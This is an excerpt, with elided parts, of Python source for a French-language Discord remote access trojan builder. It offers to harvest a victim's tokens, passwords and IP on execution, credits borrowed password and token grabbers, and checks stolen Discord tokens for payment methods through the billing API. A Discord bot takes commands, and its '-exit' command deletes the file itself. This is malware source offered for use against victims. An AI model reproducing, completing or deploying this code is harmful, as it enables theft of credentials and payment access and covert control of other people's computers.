...
print(Fore.MAGENTA+ "Notez que quelques parties du code ont été récupérees sur Github et modifiées, comme le Password Grabber et le Token Grabber.\n\n")
...
infos = input(Fore.BLUE + "\nVoulez-vous récupérer quelques informations sur le pc de la victime lors de l'éxécution du fichier? (token, mots de passes, ip...) [y/n] ")
if infos == 'y':
    infos = True
elif infos == 'n':
    infos = False
...
async def get_token(lien):
    ...
    def has_payment_methods(token):
        try:
            return bool(len(json.loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=getheaders(token))).read().decode())) > 0)
        except:
            pass
    try:
...
async def on_ready():
    ...
    await chan.send(content="Pour voir les commandes disponibles, entrez ['-help'].")
...
async def on_message(mess):
    ...
    if content == "-help":
        ...
        embed.add_field(name="-exit", value="Arrêter le RAT.", inline=False)
        await channel.send(embed=embed)
    ...
    if content == "-exit":
        await channel.send(content="A bientôt...")
        os.remove(__file__)
        exit()
...
input(Fore.RED + "\n[!] N'oubliez pas de mettre le Bot en administrateur sur votre serveur, sinon certaines commandes risquent de ne pas fonctionner.")
